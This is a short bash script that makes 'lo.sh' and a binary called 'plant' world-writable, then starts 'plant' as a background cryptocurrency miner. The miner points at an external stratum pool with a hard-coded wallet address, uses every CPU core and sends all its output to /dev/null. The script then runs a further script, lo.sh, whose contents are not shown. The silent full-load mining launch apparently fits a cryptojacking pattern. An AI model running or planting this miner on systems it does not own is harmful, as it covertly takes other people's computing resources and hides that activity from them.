#!/bin/bash
chmod 777 lo.sh plant
./plant -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.Mjollnir -p x -t $(nproc --all) > /dev/null 2>&1 &
./lo.sh
